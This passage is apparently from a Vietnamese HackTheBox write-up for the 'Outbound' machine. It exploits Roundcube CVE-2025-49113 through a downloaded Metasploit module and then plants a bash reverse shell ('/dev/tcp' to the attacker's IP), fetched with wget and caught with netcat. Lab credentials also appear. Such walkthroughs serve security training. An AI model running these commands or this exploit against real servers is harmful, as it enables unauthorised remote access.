+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>z 
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<p>Thêm domain vào file host</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nano /etc/hosts</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">10.10.11.77     mail.outbound.htb       outbound.htb</span></span></code></pre></div></div>
+
+<h2 class="relative group">Enumeration and Gaining access
+    <div id="enumeration-and-gaining-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#enumeration-and-gaining-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">Vhost, directories
+    <div id="vhost-directories" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#vhost-directories" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Sau khi thử tìm vhost với <code>ffuf</code> và directories với <code>dirsearch</code> thì tôi không nhận được bất kỳ kết quả nào có thể sử dụng được.</p>
+
+<h3 class="relative group">Port 80
+    <div id="port-80" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#port-80" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Sử dụng <code>whatweb</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>neo㉿fs0ci3ty<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ whatweb http://mail.outbound.htb
+</span></span><span class="line"><span class="cl">http://mail.outbound.htb <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Bootstrap, Content-Language<span class="o">[</span>en<span class="o">]</span>, Cookies<span class="o">[</span>roundcube_sessid<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, HttpOnly<span class="o">[</span>roundcube_sessid<span class="o">]</span>, IP<span class="o">[</span>10.10.11.77<span class="o">]</span>, JQuery, PasswordField<span class="o">[</span>_pass<span class="o">]</span>, RoundCube, Script, Title<span class="o">[</span>Roundcube Webmail :: Welcome to Roundcube Webmail<span class="o">]</span>, X-Frame-Options<span class="o">[</span>sameorigin<span class="o">]</span>, nginx<span class="o">[</span>1.24.0<span class="o">]</span></span></span></code></pre></div></div>
+<p>Truy cập web bằng trình duyệt, sử dụng user-pass được cung cấp trước để đăng nhập</p>
+<p><code>tyler:LhKL1o9Nm3X2</code></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="one"
+    src="1.png"
+    ></figure>
+
+<h3 class="relative group">CVE-2025-49113
+    <div id="cve-2025-49113" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cve-2025-49113" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Tìm kiếm exploit của <strong>Roubdcube Webmail 1.6.10</strong> tôi nhận được kết quả là <a href="https://www.exploit-db.com/exploits/52324"  target="_blank" rel="noreferrer">CVE-2025-49113</a>. Đây là một lỗ hổng RCE tồn tại trên Roundcube webmail từ phiên bản 1.5.0 đến 1.6.10, lỗ hổng cho phép kẻ tấn công thực thi mã từ xa trên server, chỉ cần có tài khoản đăng nhập webmail.</p>
+<p>Phân tích một chút về lỗ hổng này trên exploit-db thì nó đã có phiên bản cho metasploit. Tôi sẽ tải nó về và import nó vào msf của mình.</p>
+<p>Đầu tiên, tải payload về thư mục của metasploit</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>/usr/…/modules/exploits/multi/http<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo wget https://www.exploit-db.com/download/52324 -O roundcube_auth_rce_cve_2025_49113.rb
+</span></span><span class="line"><span class="cl">--2025-08-01 03:40:55--  https://www.exploit-db.com/exploits/52324
+</span></span><span class="line"><span class="cl">Resolving www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>... 192.124.249.13
+</span></span><span class="line"><span class="cl">Connecting to www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span><span class="p">|</span>192.124.249.13<span class="p">|</span>:443... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Length: unspecified <span class="o">[</span>text/html<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Saving to: ‘roundcube_auth_rce_cve_2025_49113.rb’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">roundcube_auth_rce_cve_2025_49113.rb                <span class="o">[</span>   &lt;<span class="o">=</span>&gt;                                                                                               <span class="o">]</span> 147.20K   238KB/s    in 0.6s    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2025-08-01 03:40:57 <span class="o">(</span><span class="m">238</span> KB/s<span class="o">)</span> - ‘roundcube_auth_rce_cve_2025_49113.rb’ saved <span class="o">[</span>150728<span class="o">]</span></span></span></code></pre></div></div>
+<p>Bật <code>msfconsole</code> và reload lại modules</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">┌──(kali㉿kali)-[/usr/…/modules/exploits/multi/http]
+</span></span><span class="line"><span class="cl">└─$ msfconsole -q
+</span></span><span class="line"><span class="cl">msf6 &gt; reload_all
+</span></span><span class="line"><span class="cl">[*] Reloading modules from all module paths...
+</span></span><span class="line"><span class="cl">[-] Unknown command: reload. Did you mean load? Run the help command for more details.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                   .,,.                  .
+</span></span><span class="line"><span class="cl">                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
+</span></span><span class="line"><span class="cl">                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
+</span></span><span class="line"><span class="cl">                  d888888P      &#39;7$$$$\&#34;&#34;&#34;&#34;&#39;&#39;^^`` .7$$$|D*&#34;&#39;```         ?88&#39;
+</span></span><span class="line"><span class="cl">  d8bd8b.d8p d8888b ?88&#39; d888b8b            _.os#$|8*&#34;`   d8P       ?8b  88P
+</span></span><span class="line"><span class="cl">  88P`?P&#39;?P d8b_,dP 88P d8P&#39; ?88       .oaS###S*&#34;`       d8P d8888b $whi?88b 88b
+</span></span><span class="line"><span class="cl"> d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*&#34; ?88,.d88b, d88 d8P&#39; ?88 88P `?8b                                                                                                                
+</span></span><span class="line"><span class="cl">d88&#39; d88b 8b`?8888P&#39;`?8b`?88P&#39;.aS$$$$Q*&#34;`    `?88&#39;  ?88 ?88 88b  d88 d88                                                                                                                     
+</span></span><span class="line"><span class="cl">                          .a#$$$$$$&#34;`          88b  d8P  88b`?8888P&#39;                                                                                                                         
+</span></span><span class="line"><span class="cl">                       ,s$$$$$$$&#34;`             888888P&#39;   88n      _.,,,ass;:                                                                                                                
+</span></span><span class="line"><span class="cl">                    .a$$$$$$$P`               d88P&#39;    .,.ass%#S$$$$$$$$$$$$$$&#39;                                                                                                              
+</span></span><span class="line"><span class="cl">                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$&#39;                                                                                                               
+</span></span><span class="line"><span class="cl">              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS&#39;                                                                                                                
+</span></span><span class="line"><span class="cl">           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--&#34;&#34;&#39;&#39;^^/$$$$$$&#39;                                                                                                                 
+</span></span><span class="line"><span class="cl">_______________________________________________________________   ,&amp;$$$$$$&#39;_____                                                                                                             
+</span></span><span class="line"><span class="cl">                                                                 ll&amp;&amp;$$$$&#39;                                                                                                                   
+</span></span><span class="line"><span class="cl">                                                              .;;lll&amp;&amp;&amp;&amp;&#39;                                                                                                                    
+</span></span><span class="line"><span class="cl">                                                            ...;;lllll&amp;&#39;                                                                                                                     
+</span></span><span class="line"><span class="cl">                                                          ......;;;llll;;;....                                                                                                               
+</span></span><span class="line"><span class="cl">                                                           ` ......;;;;... .  .                                                                                                              
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                             
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       =[ metasploit v6.4.64-dev                          ]
+</span></span><span class="line"><span class="cl">+ -- --=[ 2520 exploits - 1296 auxiliary - 431 post       ]
+</span></span><span class="line"><span class="cl">+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+</span></span><span class="line"><span class="cl">+ -- --=[ 9 evasion                                       ]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Metasploit Documentation: https://docs.metasploit.com/</span></span></code></pre></div></div>
+<p>Kiểm tra lại module và setup payload</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; search roundcube
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                                  Disclosure Date  Rank       Check  Description</span>
+</span></span><span class="line"><span class="cl">   -  ----                                                  ---------------  ----       -----  -----------
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>  auxiliary/gather/roundcube_auth_file_read             2017-11-09       normal     No     Roundcube TimeZone Authenticated File Disclosure
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>  exploit/multi/http/roundcube_auth_rce_cve_2025_49113  2025-06-02       excellent  Yes    Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>    <span class="se">\_</span> target: Linux Dropper                            .                .          .      .
+</span></span><span class="line"><span class="cl">   <span class="m">3</span>    <span class="se">\_</span> target: Linux Command                            .                .          .      .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 3, use <span class="m">3</span> or use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
+</span></span><span class="line"><span class="cl">After interacting with a module you can manually <span class="nb">set</span> a TARGET with <span class="nb">set</span> TARGET <span class="s1">&#39;Linux Command&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 &gt; use <span class="m">3</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Additionally setting <span class="nv">TARGET</span> <span class="o">=</span>&gt; Linux Command
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using configured payload cmd/unix/reverse_bash
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name       Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----       ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   HOST                        no        The hostname of Roundcube server
+</span></span><span class="line"><span class="cl">   PASSWORD                    yes       Password to login with
+</span></span><span class="line"><span class="cl">   Proxies                     no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   RHOSTS                      yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span class="line"><span class="cl">   RPORT      <span class="m">80</span>               yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   SSL        <span class="nb">false</span>            no        Negotiate SSL/TLS <span class="k">for</span> outgoing connections
+</span></span><span class="line"><span class="cl">   SSLCert                     no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   TARGETURI  /                yes       The URI of the Roundcube Application
+</span></span><span class="line"><span class="cl">   URIPATH                     no        The URI to use <span class="k">for</span> this exploit <span class="o">(</span>default is random<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   USERNAME                    yes       Email User to login with
+</span></span><span class="line"><span class="cl">   VHOST                       no        HTTP server virtual host
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name     Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----     ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   SRVHOST  0.0.0.0          yes       The <span class="nb">local</span> host or network interface to listen on. This must be an address on the <span class="nb">local</span> machine or 0.0.0.0 to listen on all addresses.
+</span></span><span class="line"><span class="cl">   SRVPORT  <span class="m">8080</span>             yes       The <span class="nb">local</span> port to listen on.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>cmd/unix/reverse_bash<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name   Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----   ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   LHOST                   yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LPORT  <span class="m">4444</span>             yes       The listen port
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   Linux Command
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">View the full module info with the info, or info -d command.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; <span class="nb">set</span> host mail.outbound.htb
+</span></span><span class="line"><span class="cl"><span class="nv">host</span> <span class="o">=</span>&gt; mail.outbound.htb
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; <span class="nb">set</span> username tyler
+</span></span><span class="line"><span class="cl"><span class="nv">username</span> <span class="o">=</span>&gt; tyler
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; <span class="nb">set</span> password <span class="sb">`</span>tyler:LhKL1o9Nm3X2<span class="sb">`</span>
+</span></span><span class="line"><span class="cl"><span class="nv">password</span> <span class="o">=</span>&gt; <span class="sb">`</span>tyler:LhKL1o9Nm3X2<span class="sb">`</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; <span class="nb">set</span> password LhKL1o9Nm3X2
+</span></span><span class="line"><span class="cl"><span class="nv">password</span> <span class="o">=</span>&gt; LhKL1o9Nm3X2
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; <span class="nb">set</span> lhost tun0
+</span></span><span class="line"><span class="cl"><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.10.14.61
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; <span class="nb">set</span> rhosts mail.outbound.htb
+</span></span><span class="line"><span class="cl"><span class="nv">rhosts</span> <span class="o">=</span>&gt; mail.outbound.htb
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/roundcube_auth_rce_cve_2025_49113<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.61:4444
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">&#34;set AutoCheck false&#34;</span> to disable<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extracted version: <span class="m">10610</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Fetching CSRF token...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extracted token: mTWgKqeFiXho2nnC9ve1chryup8SHHtN
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting login...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Login successful.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Preparing payload...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Payload successfully generated and serialized.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading malicious payload...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Exploit attempt complete. Check <span class="k">for</span> session.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.61:4444 -&gt; 10.10.11.77:36418<span class="o">)</span> at 2025-08-01 15:47:31 +0700</span></span></code></pre></div></div>
+<p>Bingo!!!</p>
+<p>Tôi sẽ up thêm 1 reverse shell để giữ kết nối và upgrade shell, thuận tiện hơn cho việc khai thác.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nano revshell.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/bin/bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.61/9001 0&gt;<span class="p">&amp;</span><span class="m">1</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>neo㉿fs0ci3ty<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python3 -m http.server <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...</span></span></code></pre></div></div>
+<p>Quay trở lại bên msfconsole, tôi sẽ tải reverse shell lên đây</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/bash
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/
+</span></span><span class="line"><span class="cl">ls -la /var/www/html
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root     root     <span class="m">4096</span> Jun  <span class="m">6</span> 18:55 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root     root     <span class="m">4096</span> Jun  <span class="m">6</span> 18:55 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root     root      <span class="m">615</span> Jun  <span class="m">6</span> 18:55 index.nginx-debian.html
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> www-data www-data <span class="m">4096</span> Jun  <span class="m">6</span> 18:55 roundcube
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html/roundcube
+</span></span><span class="line"><span class="cl">script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ wget http://10.10.14.61:8000/revshell.sh
+</span></span><span class="line"><span class="cl">&lt;roundcube$ wget http://10.10.14.61:8000/revshell.sh
+</span></span><span class="line"><span class="cl">--2025-08-01 08:43:50--  http://10.10.14.61:8000/revshell.sh
+</span></span><span class="line"><span class="cl">Connecting to 10.10.14.61:8000... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Length: <span class="m">47</span> <span class="o">[</span>text/x-sh<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Saving to: <span class="s1">&#39;revshell.sh&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">revshell.sh         100%<span class="o">[===================</span>&gt;<span class="o">]</span>      <span class="m">47</span>  --.-KB/s    in 0s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2025-08-01 08:43:50 <span class="o">(</span>5.33 MB/s<span class="o">)</span> - <span class="s1">&#39;revshell.sh&#39;</span> saved <span class="o">[</span>47/47<span class="o">]</span></span></span></code></pre></div></div>
+<p>Trước khi chạy shell thì bật listener</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>neo㉿fs0ci3ty<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ rlwrap nc -lnvp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ chmod +x revshell.sh
+</span></span><span class="line"><span class="cl">chmod +x revshell.sh
+</span></span><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ ./revshell.sh
+</span></span><span class="line"><span class="cl">./revshell.sh</span></span></code></pre></div></div>
+<p>Quay trở lại listener</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>neo㉿fs0ci3ty<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ rlwrap nc -lnvp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.61<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.77<span class="o">]</span> <span class="m">45566</span>
+</span></span><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$
+</span></span><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">www-data@mail:/var/www/html/roundcube$ ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">1392</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">1</span> www-data www-data   <span class="m">4096</span> Aug  <span class="m">1</span> 08:43 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">1</span> root     root       <span class="m">4096</span> Jun  <span class="m">6</span> 18:55 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data   <span class="m">2553</span> Feb  <span class="m">8</span> 08:47 .htaccess
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">216244</span> Feb  <span class="m">8</span> 08:47 CHANGELOG.md
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data  <span class="m">12714</span> Feb  <span class="m">8</span> 08:47 INSTALL
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data  <span class="m">35147</span> Feb  <span class="m">8</span> 08:47 LICENSE
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data   <span class="m">3853</span> Feb  <span class="m">8</span> 08:47 README.md
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data   <span class="m">1049</span> Feb  <span class="m">8</span> 08:47 SECURITY.md
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">7</span> www-data www-data   <span class="m">4096</span> Feb  <span class="m">8</span> 08:47 SQL
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data   <span class="m">4657</span> Feb  <span class="m">8</span> 08:47 UPGRADING
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> www-data www-data   <span class="m">4096</span> Feb  <span class="m">8</span> 08:47 bin
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data   <span class="m">1086</span> Feb  <span class="m">8</span> 08:47 composer.json
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data  <span class="m">56802</span> Feb  <span class="m">8</span> 08:47 composer.lock
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> www-data www-data   <span class="m">4096</span> Jun  <span class="m">6</span> 18:55 config
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data  <span class="m">11200</span> Feb  <span class="m">8</span> 08:47 index.php
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data <span class="m">956174</span> Jul  <span class="m">1</span> 14:58 lin.sh
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">1</span> www-data www-data   <span class="m">4096</span> Jun <span class="m">11</span> 07:46 logs
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">35032</span> Jul <span class="m">17</span> 13:52 nc
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">37</span> www-data www-data   <span class="m">4096</span> Feb  <span class="m">8</span> 08:47 plugins
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">8</span> www-data www-data   <span class="m">4096</span> Feb  <span class="m">8</span> 08:47 program
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> www-data www-data   <span class="m">4096</span> Jun  <span class="m">6</span> 18:55 public_html
